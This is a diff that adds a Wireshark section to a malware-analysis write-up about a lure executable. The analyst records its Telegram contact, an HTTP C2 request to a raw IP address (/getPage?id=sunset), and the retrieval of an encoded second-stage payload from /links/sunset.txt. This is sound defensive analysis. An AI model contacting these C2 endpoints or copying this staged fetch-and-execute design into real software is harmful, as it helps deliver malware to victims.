@@ -208,7 +208,114 @@ Since no proxy-aware traffic was observed, further packet-level inspection was r
 
 ## WireShark Analysis
 
+I needed to look deeper to identify whether there is command-and-control (C2) communication that isn't visible through the proxy.
 
+I reverted to a pre-infection snapshot of my VM for a clean baseline, set wireshark to capture and opened the 'Position Details and Compensation Policy For Emp.EXE' again.
+
+Following execution, network activity was immediately observed. Within seconds, the system initiated multiple outbound connections, indicating automated behaviour rather than user-driven interaction.
+
+---
+
+## Key Observations
+
+### 1. Immediate Network Burst
+
+- Rapid outbound connections to multiple external IP addresses
+- Mix of:
+  - TCP (primarily port 443 and 80)
+  - DNS queries
+- Behaviour consistent with:
+  - beaconing
+  - infrastructure discovery
+  - payload retrieval
+
+**Screenshot to include:**
+- Conversations view showing multiple external IPs and packet counts
+
+---
+
+### 2. Telegram Infrastructure Contact
+
+DNS query observed:
+
+- `t.me` → `149.154.167.99`
+
+Followed by:
+
+- TLS handshake (Client Hello → Server Hello)
+- Encrypted communication established
+
+**Assessment:**
+This suggests use of Telegram infrastructure, likely for signalling, fallback communications, or operator interaction.
+
+**Screenshots to include:**
+- DNS query resolving `t.me`
+- TLS handshake showing Client Hello with SNI: `t.me`
+
+---
+
+### 3. Suspicious HTTP C2 Communication
+
+Primary suspicious host identified:
+
+- `172.86.89.235` (port 80)
+
+#### Initial Request
+
+    GET /getPage?id=sunset HTTP/1.1
+    Host: 172.86.89.235
+    User-Agent: python-requests/2.33.0
+
+**Key detail:**
+
+- The `python-requests` user-agent strongly indicates scripted or programmatic communication embedded within the malware.
+
+---
+
+### 4. C2 Response (Stage Trigger)
+
+Server response:
+
+    HTTP/1.1 200 OK
+
+Returns:
+
+    http://172.86.89.235/links/sunset.txt
+
+**Assessment:**
+- This endpoint acts as a tasking or redirect layer
+- Confirms a staged delivery mechanism
+
+---
+
+### 5. Payload Retrieval
+
+Second request observed:
+
+    GET /links/sunset.txt HTTP/1.1
+
+Response:
+
+- `Content-Type: text/plain`
+- Large encoded payload returned
+
+---
+
+## Behavioural Summary
+
+This traffic confirms a **multi-stage C2 workflow**:
+
+1. Initial execution  
+2. Contact C2 endpoint (`/getPage`)  
+3. Receive next-stage instruction  
+4. Retrieve encoded payload (`/sunset.txt`)  
+5. Execute decoded content locally  
+
+This behaviour is consistent with:
+
+- loader malware  
+- staged payload delivery systems  
+- evasive infrastructure design  
 
 ---
 
